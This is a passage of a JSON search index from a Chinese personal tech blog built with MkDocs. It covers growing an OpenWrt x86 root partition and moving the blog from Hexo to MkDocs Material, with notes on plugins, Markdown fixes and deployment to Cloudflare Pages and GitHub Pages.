</ul>","tags":["openwrt","\u955c\u50cf"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2023/10/30/2023-10-30-openwrt-x86%E5%8D%87%E7%BA%A7/#\u589e\u52a0-root-\u78c1\u76d8\u5927\u5c0f","title":"\u589e\u52a0 root \u78c1\u76d8\u5927\u5c0f","text":"<p>fdisk delet \u518d create\uff0c\u4f1a\u5bfc\u81f4 PARTUUID \u53d8\u5316\uff0c\u4ece\u800c\u5bfc\u81f4 openwrt grub \u5f15\u5bfc\u5931\u8d25\u3002 </p> <p>resize2fs \u76f4\u63a5\u5bf9 /dev/sda2 \u64cd\u4f5c\uff0c\u91cd\u542f\u540e\u4ecd\u7136\u6ca1\u53d8</p> <p>\u4e0d\u652f\u6301 on-line resizing </p> <p>\u65b9\u6cd5</p> <p>[HOWTO] Resizing root partition on x86 - Installing and Using OpenWrt - OpenWrt Forum [OpenWrt Wiki] OpenWrt on x86 hardware (PC / VM / server)</p> <pre><code>opkg install losetup resize2fs\n</code></pre> <ul> <li>\u7b2c\u4e00\u6b65\uff0c\u4fee\u6539\u5206\u533a\u5927\u5c0f<ul> <li>parted \u65b9\u6848\u8bf4\u662f\u53ef\u4ee5\u5728\u4e0d\u4fee\u6539\u5206\u533a\u8868\u7684\u60c5\u51b5\u4e0b\uff0c\u589e\u5927\u5206\u533a\u5927\u5c0f\u3002\u4f46\u662f\u6211\u8fd0\u884c <code>parted -f -s /dev/sda resizepart 2 100%</code> \u4e0d\u8d77\u4f5c\u7528\uff0c\u4e8e\u662f\u8fd8\u662f\u4f7f\u7528 fdisk</li> <li> <p>fdisk \u4f1a\u4fee\u6539\u5206\u533a\u8868\uff0c\u6539\u53d8 PARTUUID\uff0c\u9700\u8981\u4fee\u6539 grub \u914d\u7f6e\u6587\u4ef6</p> <pre><code>UUID=\"$(partx -g -o UUID /dev/sda2)\"\nsed -i -r -e \"s|(PARTUUID=)\\S+|\\1${UUID}|g\" /boot/grub/grub.cfg\n</code></pre> </li> </ul> </li> </ul> <ul> <li>\u7b2c\u4e8c\u6b65\uff0cresize2fs\u3002<ul> <li> <p>\u4e0d\u652f\u6301 online resize\uff0c\u9700\u8981\u4f7f\u7528 losetup</p> <pre><code># Map loop device to root partition\nlosetup /dev/loop0 /dev/sda2\n\n# Expand root filesystem\nresize2fs -f /dev/loop0\n</code></pre> </li> </ul> </li> </ul> <p></p> <p>\u4e0d\u652f\u6301 online resize \u7684\u539f\u56e0</p> <p>FS#2951 - x86_64 ext4 generic: online resizing of root partition fails \u00b7 Issue #7729 \u00b7 openwrt/openwrt (github.com)</p>","tags":["openwrt","\u955c\u50cf"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2024/01/07/hexo%E8%BF%81%E7%A7%BB%E5%88%B0mkdocs/","title":"hexo \u8fc1\u79fb\u5230 mkdoc","text":"<p>\u6211\u6bd4\u8f83\u559c\u6b22 hexo \u7684 tags \u5b57\u4e91\u7684\u6548\u679c\uff0c\u4e0d\u8fc7\u7531\u4e8e\u4ee5\u4e0b\u539f\u56e0\uff0c\u6211\u6253\u7b97\u8fc1\u79fb\u5230\u65b0\u7684\u9759\u6001\u535a\u5ba2\u6846\u67b6 mkdocs material theme</p> <ul> <li>hexo nodejs \u7684\u4f9d\u8d56\u5b9e\u5728\u662f\u592a\u9ebb\u70e6\u4e86</li> <li>hexo \u5c55\u793a\u7684\u4fe1\u606f\u91cf\u592a\u5c11\u4e86\uff08\u4e5f\u53ef\u80fd\u662f\u6211\u4f7f\u7528\u7684\u6a21\u677f\u7684\u95ee\u9898\uff09<ul> <li>\u6211\u611f\u89c9\u8fd9\u4e00\u70b9\u4e0a mkdoc \u6548\u679c\u5c31\u5f88\u597d\uff0c\u5728\u5927\u663e\u793a\u5668\u4e0a\u80fd\u591f\u663e\u793a\u66f4\u591a\u4fe1\u606f\uff0c\u67e5\u9605\u535a\u5ba2\u7684\u6548\u7387\u66f4\u9ad8</li> </ul> </li> </ul> <p>TODO</p> <ul> <li> \u96c6\u6210\u8bc4\u8bba\u533a\uff1aAdding a comment system - Material for MkDocs (squidfunk.github.io)</li> <li> \u770b\u677f\u5a18</li> </ul> <p>\u53c2\u8003\u65b9\u6848</p> <ul> <li>\u6770\u54e5\u7684{\u8fd0\u7ef4\uff0c\u7f16\u7a0b\uff0c\u8c03\u677f\u5b50}\u5c0f\u7b14\u8bb0 (jia.je)</li> <li>jiegec/blog-source: The source of my blog. (github.com)</li> <li>\u30fe (<sup>\u25bd</sup>*))) \u6b22\u8fce\u56de\u6765~ (shaojiemike.top)</li> </ul> <p>p.s. \u7531\u4e8e\u6211\u4f7f\u7528\u7684 markdown \u7f16\u8f91\u5668\u7684\u539f\u56e0\uff0c\u624d\u53d1\u73b0\u6807\u51c6 MD \u4e2d list \u524d\u9762\u9700\u8981\u6709\u4e00\u4e2a\u7a7a\u884c\u3002\u4e5f\u5c31\u662f\u8fc4\u4eca\u5199\u7684\u535a\u5ba2\u5747\u8e29\u4e86\u8fd9\u4e2a\u5751\u3002\u3002\u3002\u800c mkdocs \u4e0d\u652f\u6301\u8fd9\u4e2a\u975e\u6807\u51c6\u884c\u4e3a\uff0c\u4ee5\u540e\u6162\u6162\u66f4\u6b63\u5427</p>","tags":["hexo","mkdocs","cloudfare","obsidian","markdownlint-cli"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2024/01/07/hexo%E8%BF%81%E7%A7%BB%E5%88%B0mkdocs/#mkdocs-\u6559\u7a0b","title":"mkdocs \u6559\u7a0b","text":"","tags":["hexo","mkdocs","cloudfare","obsidian","markdownlint-cli"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2024/01/07/hexo%E8%BF%81%E7%A7%BB%E5%88%B0mkdocs/#install--run","title":"install &amp; run","text":"<p>\u5b89\u88c5 mkdocs \u975e\u5e38\u7b80\u5355</p> <pre><code>pip install mkdocs-material\n</code></pre> <p>\u8fd0\u884c\u672c\u5730\u670d\u52a1\u5668</p> <pre><code>mkdocs serve -a 0.0.0.0:8000\n</code></pre> <p>\u751f\u6210\u9759\u6001\u9875\u9762\uff0c\u9ed8\u8ba4\u8f93\u51fa\u5230<code>site/</code>\u76ee\u5f55</p> <pre><code>mkdocs build\n</code></pre>","tags":["hexo","mkdocs","cloudfare","obsidian","markdownlint-cli"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2024/01/07/hexo%E8%BF%81%E7%A7%BB%E5%88%B0mkdocs/#\u914d\u7f6e","title":"\u914d\u7f6e","text":"<p>\u53ea\u6709\u4e00\u4e2a\u914d\u7f6e\u6587\u4ef6 mkdocs.yml</p> <pre><code>mkdocs new .\n</code></pre> <pre><code>.\n\u251c\u2500 docs/\n\u2502  \u2514\u2500 index.md\n\u2514\u2500 mkdocs.yml\n</code></pre>","tags":["hexo","mkdocs","cloudfare","obsidian","markdownlint-cli"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2024/01/07/hexo%E8%BF%81%E7%A7%BB%E5%88%B0mkdocs/#mkdocs-blog-\u652f\u6301","title":"mkdocs blog \u652f\u6301","text":"<p>Setting up a blog - Material for MkDocs (squidfunk.github.io)</p>","tags":["hexo","mkdocs","cloudfare","obsidian","markdownlint-cli"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2024/01/07/hexo%E8%BF%81%E7%A7%BB%E5%88%B0mkdocs/#tags-\u7d22\u5f15\u9875\u9762","title":"tags \u7d22\u5f15\u9875\u9762","text":"<p>category \u548c archive \u9875\u9762\u662f\u81ea\u52a8\u751f\u6210\u7684\uff0ctags \u9875\u9762\u9700\u8981\u624b\u52a8\u914d\u7f6e</p> <p>mkdocs automatically generating\u00a0archive\u00a0and\u00a0category\u00a0indexes,\u00a0post slugs, configurable\u00a0pagination\u00a0and more.</p> <p>\u60f3\u8981\u521b\u5efa\u4e00\u4e2a\u9875\u9762\u5305\u542b\u6240\u6709 tag \u7d22\u5f15\uff0c\u9700\u8981\u521b\u5efa<code>docs/tags.md</code>\uff0c\u5185\u5bb9\u5982\u4e0b</p> <pre><code># \u6807\u7b7e\n\n[TAGS]\n</code></pre> <p>mkdocs \u542f\u7528 tags plugin</p> <pre><code>plugins:\n  - tags:\n      # enabled: !ENV [DEPLOY, false]\n      enabled: true\n      tags_file: tags.md\n</code></pre>","tags":["hexo","mkdocs","cloudfare","obsidian","markdownlint-cli"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2024/01/07/hexo%E8%BF%81%E7%A7%BB%E5%88%B0mkdocs/#\u5176\u5b83","title":"\u5176\u5b83","text":"","tags":["hexo","mkdocs","cloudfare","obsidian","markdownlint-cli"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2024/01/07/hexo%E8%BF%81%E7%A7%BB%E5%88%B0mkdocs/#excerpt","title":"excerpt","text":"<p>\u4f7f\u7528<code>&lt;!-- more --&gt;</code>\u5206\u9694\u535a\u5ba2 p.s \u4e2d\u95f4\u5fc5\u987b\u4fdd\u7559\u7a7a\u683c\uff0c\u4f7f\u7528<code>&lt;!--more--&gt;</code>\u65e0\u6cd5\u751f\u6548</p>","tags":["hexo","mkdocs","cloudfare","obsidian","markdownlint-cli"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2024/01/07/hexo%E8%BF%81%E7%A7%BB%E5%88%B0mkdocs/#authors","title":"authors","text":"<p>create the <code>.authors.yml</code>\u00a0file in your blog directory</p> <pre><code>authors:\n  squidfunk:\n    name: Martin Donath\n    description: Creator\n    avatar: https://github.com/squidfunk.png\n</code></pre> <p>\u7136\u540e\u5c31\u53ef\u4ee5\u5728\u6587\u6863\u7684\u5143\u6570\u636e\u4e2d\u6dfb\u52a0 author \u5217\u8868</p>","tags":["hexo","mkdocs","cloudfare","obsidian","markdownlint-cli"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2024/01/07/hexo%E8%BF%81%E7%A7%BB%E5%88%B0mkdocs/#linking","title":"linking","text":"<p>While\u00a0post URLs\u00a0are dynamically computed, the\u00a0built-in blog plugin\u00a0ensures that all links from and to posts and a post's assets are correct.</p> <p>\u6587\u6863\u4e2d\u94fe\u63a5\u5230\u53e6\u4e00\u4e2a\u6587\u6863</p> <pre><code>[Hello World!](blog/posts/hello-world.md)\n</code></pre> <p>\u94fe\u63a5\u5230\u4e00\u4e2a\u9875\u9762\uff0c\u53ea\u9700\u8981\u6307\u5411\u8be5\u9875\u9762\u7684\u7d22\u5f15 md \u6587\u4ef6</p> <pre><code>[Blog](../index.md)\n</code></pre>","tags":["hexo","mkdocs","cloudfare","obsidian","markdownlint-cli"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2024/01/07/hexo%E8%BF%81%E7%A7%BB%E5%88%B0mkdocs/#readtime","title":"readtime","text":"<p>\u663e\u793a\u6587\u7ae0\u7684\u9884\u8ba1\u9605\u8bfb\u65f6\u95f4\u3002\u81ea\u52a8\u542f\u7528\uff0c\u5982\u679c\u5acc\u4f30\u8ba1\u7684\u4e0d\u51c6\u786e\uff0c\u53ef\u4ee5\u624b\u52a8\u8bbe\u7f6e</p> <pre><code>---\ndate: 2023-01-31\nreadtime: 15\n---\n</code></pre>","tags":["hexo","mkdocs","cloudfare","obsidian","markdownlint-cli"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2024/01/07/hexo%E8%BF%81%E7%A7%BB%E5%88%B0mkdocs/#\u95ee\u9898","title":"\u95ee\u9898","text":"","tags":["hexo","mkdocs","cloudfare","obsidian","markdownlint-cli"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2024/01/07/hexo%E8%BF%81%E7%A7%BB%E5%88%B0mkdocs/#\u6ca1\u6709-category-\u9875\u9762","title":"\u6ca1\u6709 category \u9875\u9762","text":"<p>build \u540e\u624d\u4f1a\u751f\u6210\uff0c\u76f4\u63a5 serve \u662f\u770b\u4e0d\u5230\u7684</p>","tags":["hexo","mkdocs","cloudfare","obsidian","markdownlint-cli"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2024/01/07/hexo%E8%BF%81%E7%A7%BB%E5%88%B0mkdocs/#\u6709\u7528\u7684-plugin","title":"\u6709\u7528\u7684 Plugin","text":"","tags":["hexo","mkdocs","cloudfare","obsidian","markdownlint-cli"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2024/01/07/hexo%E8%BF%81%E7%A7%BB%E5%88%B0mkdocs/#meta","title":"meta","text":"<p>\u53ef\u4ee5\u4e3a\u4e00\u4e2a\u76ee\u5f55\u7684\u6240\u6709\u6587\u4ef6\u8bbe\u7f6e\u57fa\u7840 meta \u4fe1\u606f\uff0c\u5728\u5206\u95e8\u522b\u7c7b\u5b58\u50a8\u535a\u5ba2\u65f6\u6bd4\u8f83\u6709\u7528\u3002\u4f46\u662f\u76ee\u524d\u662f\u9700\u8981\u4ed8\u8d39\u624d\u80fd\u4f7f\u7528 Sponsors only\u00a0\u2013 this plugin is currently reserved to\u00a0our awesome sponsors.</p> <p>Built-in meta plugin - Material for MkDocs (squidfunk.github.io) The meta plugin solves the problem of setting metadata (front matter) for all pages in a folder, i.e., a subsection of your project, which is particularly useful to ensure that a certain subset of pages features specific tags, uses a custom template, or is attributed to an author.</p>","tags":["hexo","mkdocs","cloudfare","obsidian","markdownlint-cli"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2024/01/07/hexo%E8%BF%81%E7%A7%BB%E5%88%B0mkdocs/#\u9759\u6001\u7f51\u7ad9\u90e8\u7f72","title":"\u9759\u6001\u7f51\u7ad9\u90e8\u7f72","text":"","tags":["hexo","mkdocs","cloudfare","obsidian","markdownlint-cli"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2024/01/07/hexo%E8%BF%81%E7%A7%BB%E5%88%B0mkdocs/#cloudfare-page","title":"cloudfare page","text":"<p>\u53c2\u8003\u8d44\u6599\uff1a</p> <ul> <li>mkdocs+cf page \u8d44\u6599\uff1aDeploy MkDocs with Material or Material Insiders theme to Cloudflare Pages - Starfall Projects</li> <li>cf page \u6587\u6863\uff1aGet started guide \u00b7 Cloudflare Pages docs</li> <li>cloudflare build platform \u4ecb\u7ecd\uff1aModernizing the toolbox for Cloudflare Pages builds</li> </ul> <p>cf page \u4f18\u52bf</p> <ul> <li>cf page \u652f\u6301\u5f88\u591a preset\uff08\u5404\u79cd\u9759\u6001\u7f51\u7ad9\u6846\u67b6\uff09\uff0cmkdocs \u662f\u5176\u4e2d\u4e4b\u4e00\uff0c\u56e0\u6b64\u914d\u7f6e\u975e\u5e38\u7b80\u5355\u3002<ul> <li>gh page \u53ea\u652f\u6301 Jekyll\uff0c\u5176\u5b83\u9700\u8981\u81ea\u5b9a\u4e49 workflow \u6765\u751f\u6210 html \u9875\u9762</li> </ul> </li> <li>\u652f\u6301\u8bbe\u7f6e Production branch \u548c Preview branch\uff0c\u76d1\u542c\u4e0d\u540c git \u5206\u652f</li> <li>\u652f\u6301\u9009\u62e9\u4e0d\u540c\u7684 build platform\uff0c\u76ee\u524d\u6709 ubuntu22.04 \u548c ubuntu20.04</li> </ul> <p>\u6ce8\u610f\uff1a\u9700\u8981\u914d\u7f6e<code>requirements.txt</code>\u6587\u4ef6\u544a\u8bc9 cf \u5b89\u88c5\u4f9d\u8d56\uff0c\u5426\u5219 cf build \u65f6\u4f1a\u62a5\u9519<code>mkdocs not found</code></p> <pre><code>mkdocs-material\nmkdocs-material-extensions\nmkdocs-git-revision-date-localized-plugin\nmkdocs-wavedrom-plugin\nmkdocs-rss-plugin\n</code></pre> <p>\u914d\u7f6e custom domain \u65f6\u76f4\u63a5\u6dfb\u52a0\u57df\u540d\u5373\u53ef</p>","tags":["hexo","mkdocs","cloudfare","obsidian","markdownlint-cli"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2024/01/07/hexo%E8%BF%81%E7%A7%BB%E5%88%B0mkdocs/#github-page","title":"github page","text":"<p>\u7531\u4e8e\u539f\u672c\u5df2\u7ecf\u521b\u5efa\u8fc7 github page \u4e86\uff0c\u672c\u4ee5\u4e3a\u65e0\u6cd5\u518d\u521b\u5efa\u65b0\u7684 github page\uff0c\u7136\u540e\u53d1\u73b0 github \u652f\u6301\u591a\u79cd page\uff01</p> <ul> <li>user, organization page \u662f\u8d26\u6237\u6027\u8d28\u7684 page\uff0c\u5bf9\u5e94<code>&lt;username&gt;.github.io</code>\u6216<code>&lt;organization&gt;.github.io</code>\u7684\u4ed3\u5e93</li> <li>project page \u5219\u6ca1\u6709\u9650\u5236\uff0c\u53ef\u4ee5\u521b\u5efa\u4efb\u610f\u591a\u4e2a\uff0c\u901a\u8fc7<code>http(s)://&lt;username&gt;.github.io/&lt;repository&gt;</code>\u8bbf\u95ee\u3002<ul> <li>private \u4ed3\u5e93\u521b\u5efa public page \u9700\u8981 github pro \u4ee5\u4e0a</li> </ul> </li> </ul> <p>\u53c2\u8003\u6587\u6863</p> <ul> <li>\u5173\u4e8e gh page \u7c7b\u578b\uff0c\u9650\u5236\uff1aAbout GitHub Pages - GitHub Docs</li> <li>\u914d\u7f6e publishing source\uff1aConfiguring a publishing source for your GitHub Pages site - GitHub Docs</li> <li>mkdocs \u5173\u4e8e deploy \u6587\u6863\uff08github \u548c gitlab\uff09\uff1aPublishing your site - Material for MkDocs (squidfunk.github.io)</li> </ul>","tags":["hexo","mkdocs","cloudfare","obsidian","markdownlint-cli"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2024/01/07/hexo%E8%BF%81%E7%A7%BB%E5%88%B0mkdocs/#\u914d\u7f6e-publishing-source","title":"\u914d\u7f6e publishing source","text":"<p>\u6709\u4e24\u79cd\u914d\u7f6e page source \u65b9\u6cd5</p> <ul> <li>deploy from a branch\uff1a\u901a\u5e38\u5bf9\u5e94\u4e00\u4e2a gh-page \u5206\u652f\uff0c\u53ea\u5305\u542b\u9759\u6001 html \u6587\u4ef6<ul> <li>\u53ef\u4ee5\u662f\u672c\u5730\u4f7f\u7528\u7c7b\u4f3c<code>hexo deploy</code>, <code>mkdocs gh-deploy</code>\u547d\u4ee4\u751f\u6210\uff0c\u7136\u540e push \u5230 github \u5206\u652f</li> <li>\u4e5f\u53ef\u4ee5\u662f\u81ea\u5b9a\u4e49 gh workflow\uff0c\u751f\u6210\u7136\u540e push \u5230 gh-page \u5206\u652f\u3002Most external CI workflows \"deploy\" to GitHub Pages by committing the build output to the\u00a0<code>gh-pages</code>\u00a0branch of the repository, and typically include a\u00a0<code>.nojekyll</code>\u00a0file.</li> </ul> </li> <li>github action<ul> <li>\u4e5f\u662f\u5148\u901a\u8fc7 action \u751f\u6210\u9759\u6001\u7f51\u7ad9\u6587\u4ef6\uff0c\u6700\u540e\u901a\u8fc7\u00a0<code>actions/upload-pages-artifact</code>\u00a0\u548c\u00a0<code>actions/deploy-pages</code>\u53d1\u5e03\u5230 gh page\u3002</li> </ul> </li> </ul> <p>mkdocs \u5b98\u65b9\u63d0\u4f9b\u7684\u65b9\u5f0f\u662f\u65b9\u5f0f 1\uff0c\u4f7f\u7528\u5b83\u7684 workflow \u811a\u672c\uff0c\u4f1a\u81ea\u52a8\u751f\u6210\u9759\u6001\u7f51\u7ad9\u6587\u4ef6\u5e76 push \u5230 gh-page \u5206\u652f\u3002 p.s \u9700\u8981\u4fee\u6539\u5176\u4e2d pip install \u547d\u4ee4\uff0c\u8865\u5145\u5b8c\u4f9d\u8d56</p>","tags":["hexo","mkdocs","cloudfare","obsidian","markdownlint-cli"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2024/01/07/hexo%E8%BF%81%E7%A7%BB%E5%88%B0mkdocs/#\u914d\u7f6e-custom-domain","title":"\u914d\u7f6e custom domain","text":"<p>Under \"Custom domain\", type your custom domain, then click\u00a0Save. If you are publishing your site from a branch, this will create a commit that adds a\u00a0<code>CNAME</code>\u00a0file directly to the root of your source branch. If you are publishing your site with a custom GitHub Actions workflow, no\u00a0<code>CNAME</code>\u00a0file is created.</p> <p>\u914d\u7f6e custom domain</p> <ul> <li>\u57df\u540d\u89e3\u6790\u670d\u52a1\u63d0\u4f9b\u5546\uff1a\u6dfb\u52a0\u4e00\u6761 CNAME record\uff0c\u6307\u5411 user.github.io</li> <li>github<ul> <li>\u5bf9\u4e8e source \u4e3a deploy from a branch\uff0c\u5728<code>/</code>\u8def\u5f84\u6dfb\u52a0 CNAME \u6587\u4ef6\uff0c\u5305\u542b CNAME \u540d\uff08\u901a\u8fc7 setting \u4e2d\u8bbe\u7f6e\uff0c\u4e5f\u4f1a\u81ea\u52a8\u521b\u5efa\u8be5 CNAME \u6587\u4ef6\uff09</li> <li>\u5bf9\u4e8e source \u4e3a github action\uff0c\u901a\u8fc7 setting \u8bbe\u7f6e\u5373\u53ef\uff0c\u4e0d\u4f1a\u521b\u5efa CNAME \u6587\u4ef6 \u5982\u679c\u5df2\u7ecf\u521b\u5efa\u8fc7 user \u6216 organization site\uff0c\u5219\u521b\u5efa project site \u65f6\u4f1a\u81ea\u52a8\u4f7f\u7528\u4e4b\u524d\u7684\u57df\u540d</li> </ul> </li> </ul>","tags":["hexo","mkdocs","cloudfare","obsidian","markdownlint-cli"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2024/01/07/hexo%E8%BF%81%E7%A7%BB%E5%88%B0mkdocs/#markdown-\u683c\u5f0f\u4fee\u590d","title":"markdown \u683c\u5f0f\u4fee\u590d","text":"<p>\u539f\u672c\u5199\u7684 markdown \u6587\u4ef6\u6709\u4e00\u4e9b\u683c\u5f0f\u4e0d\u592a\u89c4\u8303\uff08\u5e38\u89c1\u9519\u8bef<sup>1</sup>\uff09\uff0c\u5207\u6362\u6210 mkdocs \u540e\uff0c\u6709\u8bb8\u591a\u62a5\u9519\u4fe1\u606f\u3002\u4ee5\u4e0b\u5217\u51fa\u5176\u4e2d\u4e00\u4e9b\u95ee\u9898\uff0c\u5e76\u4e14\u63d0\u4f9b\u4e00\u4e2a\u81ea\u52a8\u4fee\u590d\u811a\u672cfix_markdown.py\uff0c\u907f\u514d\u4e00\u4e9b\u67af\u71e5\u7684\u624b\u52a8\u4fee\u6539\u3002</p>","tags":["hexo","mkdocs","cloudfare","obsidian","markdownlint-cli"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2024/01/07/hexo%E8%BF%81%E7%A7%BB%E5%88%B0mkdocs/#metadata","title":"metadata","text":"<p>markdown \u5f00\u5934\u90e8\u5206\u53ef\u4ee5\u5b9a\u4e49\u4e00\u4e9b\u5143\u6570\u636e\uff0c\u5982\u4f5c\u8005\uff0c\u65e5\u671f\u7b49\uff0c\u8fd9\u90e8\u5206\u53eb\u505a frontmatter\u3002\u901a\u5e38\u91c7\u7528 yaml \u683c\u5f0f\u3002</p> <p>\u65e5\u671f\u53ea\u80fd\u4f7f\u7528<code>YY-mm-dd</code>\u6216\u8005<code>YY-mm-dd HH:MM:SS</code>\uff0c\u50cf<code>2023-04-20 16:22</code>\u8fd9\u6837\u7684\u683c\u5f0f\u662f\u65e0\u6cd5\u8bc6\u522b\u7684</p> <pre><code>ERROR   -  Error reading metadata 'date' of post 'blog/posts/2023-04-20-\u5177\u4f53\u6570\u5b66.md' in 'docs':\n           Expected type: &lt;class 'datetime.date'&gt; or &lt;class 'datetime.datetime'&gt; but received: &lt;class 'str'&gt;\n</code></pre> <p>\u811a\u672c\u652f\u6301\u4fee\u590d\u8be5\u95ee\u9898\u3002</p> <p>\u6211\u4f7f\u7528 obsidian \u7684 Template \u529f\u80fd\u6765\u81ea\u52a8\u751f\u6210 metadata\uff0c\u5176\u9ed8\u8ba4\u751f\u6210\u7684\u65f6\u95f4\u683c\u5f0f\u662f\u4e0d\u5e26\u79d2\u7684\u65f6\u95f4\u683c\u5f0f\uff0c\u56e0\u800c\u5bfc\u81f4\u4e86\u4ee5\u4e0a\u95ee\u9898\u3002</p> <p>\u53ef\u4ee5\u81ea\u5b9a\u4e49\u5176\u6a21\u677f\u65f6\u95f4\u683c\u5f0f\uff1aTemplates - Obsidian Help \u4fee\u6b63\u540e\u6a21\u677f\u5982\u4e0b\uff1a</p> <pre><code>---\ntitle: {{title}}\ndate: {{date}} {{time:HH:mm:ss}}\ntags:\n- linux\ncategories:\n- \u6298\u817e\n---\n\n&lt;!-- more --&gt;\n</code></pre>","tags":["hexo","mkdocs","cloudfare","obsidian","markdownlint-cli"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2024/01/07/hexo%E8%BF%81%E7%A7%BB%E5%88%B0mkdocs/#\u56fe\u7247\u94fe\u63a5","title":"\u56fe\u7247\u94fe\u63a5","text":"<p>\u539f\u672c\u4f7f\u7528\u4e86\u4e24\u79cd\u683c\u5f0f<code>/images/xxx/xxx.png</code>, <code>images/xxx/xxx.png</code>\u7684\u56fe\u7247\u94fe\u63a5\uff0c\u5bfc\u81f4\u62a5\u9519</p> <pre><code>Doc file 'blog/posts/2023-04-20-\u5177\u4f53\u6570\u5b66.md' contains a relative link 'images/\u5177\u4f53\u6570\u5b66/image-20220607171500766.png', but the target\n           'blog/posts/images/\u5177\u4f53\u6570\u5b66/image-20220607171500766.png' is not found among documentation files\n</code></pre> <p>mkdocs \u6240\u6709\u94fe\u63a5\u5747\u4f7f\u7528\u76f8\u5bf9\u8def\u5f84\uff0c\u6539\u4e3a\u76f8\u5bf9\u4e8e md \u6587\u4ef6\u7684\u8def\u5f84\u5373\u53ef\u3002 p.s \u8fd9\u91cc\u4e0d\u5f97\u4e0d\u63d0\u4e0b obsidian \u7684\u65b9\u4fbf\u4e4b\u5904\u4e86\u3002obsidian \u91c7\u7528\u4e86\u5c3d\u53ef\u80fd\u5339\u914d\u7684\u539f\u5219\uff0c\u56e0\u6b64\u53ea\u8981\u6587\u4ef6\u540d\u76f8\u540c\uff0c\u65e0\u8bba\u4f4d\u4e8e\u54ea\u4e2a\u76ee\u5f55\u4e0b\uff0c\u5747\u80fd\u6b63\u786e\u5339\u914d</p> <p>\u4f7f\u7528\u6b63\u5219\u4fee\u6539\u5173\u952e\u4ee3\u7801\u5982\u4e0b</p> <pre><code>RE = fr'!\\[(.*?)\\]\\(/{old_prefix}(.*?)\\)'   # old_prefix = images/\nm1 = re.findall(RE, content)\nif m1:\n  content = re.sub(RE, f'![\\g&lt;1&gt;]({new_prefix}\\g&lt;2&gt;)', content)\n</code></pre>","tags":["hexo","mkdocs","cloudfare","obsidian","markdownlint-cli"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2024/01/07/hexo%E8%BF%81%E7%A7%BB%E5%88%B0mkdocs/#\u5185\u90e8\u94fe\u63a5","title":"\u5185\u90e8\u94fe\u63a5","text":"<p>Setting up a blog - Material for MkDocs (squidfunk.github.io)</p> <p>mkdocs \u4f7f\u7528\u76f8\u5bf9\u8def\u5f84\uff0c\u6307\u5411\u5f15\u7528\u7684 md \u6587\u4ef6\uff0c\u5e76\u4e14\u4e5f\u652f\u6301\u4f7f\u7528<code>#</code>\u5b9a\u4f4d\u5230\u7279\u5b9a section\u3002\u539f\u672c hexo \u7684\u94fe\u63a5\u683c\u5f0f\u5219\u590d\u6742\u591a\u4e86\u3002 \u7531\u4e8e\u6570\u76ee\u4e0d\u591a\uff0c\u624b\u52a8\u4fee\u6539\u5373\u53ef\u3002</p> <pre><code>[openwrt\u914d\u7f6e#ipv6](2022-02-13-openwrt\u914d\u7f6e.md#ipv6)\n</code></pre> <p>p.s obsidan \u540c\u6837\u652f\u6301\u5b9a\u4f4d\u5230\u53e6\u4e00\u4e2a markdown \u6587\u6863\uff0c\u5e76\u4e14\u4e0d\u7528\u592a\u5728\u610f\u8def\u5f84</p>","tags":["hexo","mkdocs","cloudfare","obsidian","markdownlint-cli"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2024/01/07/hexo%E8%BF%81%E7%A7%BB%E5%88%B0mkdocs/#\u6570\u5b66\u516c\u5f0f","title":"\u6570\u5b66\u516c\u5f0f","text":"<p>Math - Material for MkDocs (squidfunk.github.io) \u6709 MathJax \u548c KaTex \u4e24\u4e2a\u9009\u62e9</p> <ul> <li>Speed: KaTeX is generally faster than MathJax. If your site requires rendering large quantities of complex equations quickly, KaTeX may be the better choice.</li> <li>Syntax Support: MathJax supports a wider array of LaTeX commands and can process a variety of mathematical markup languages (like AsciiMath and MathML). If you need advanced LaTeX features, MathJax may be more suitable.</li> </ul> <p>\u4f46\u662f\u4f7f\u7528\u4e24\u79cd\u65b9\u6848\uff0c\u636e\u65e0\u6cd5\u6b63\u786e\u663e\u793a\u6211\u7684\u5177\u4f53\u6570\u5b66\u90a3\u7bc7\u6587\u7ae0\u7684\u6240\u6709\u6570\u5b66\u516c\u5f0f\uff0c\u5e76\u4e14 MathJax \u6b63\u786e\u8bc6\u522b\u7684\u66f4\u5c11\u3002\u56e0\u6b64\u6700\u540e\u9009\u7528\u4e86 KaTeX</p>","tags":["hexo","mkdocs","cloudfare","obsidian","markdownlint-cli"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2024/01/07/hexo%E8%BF%81%E7%A7%BB%E5%88%B0mkdocs/#\u5217\u8868\u524d\u7a7a\u884c","title":"\u5217\u8868\u524d\u7a7a\u884c","text":"<p>markdown 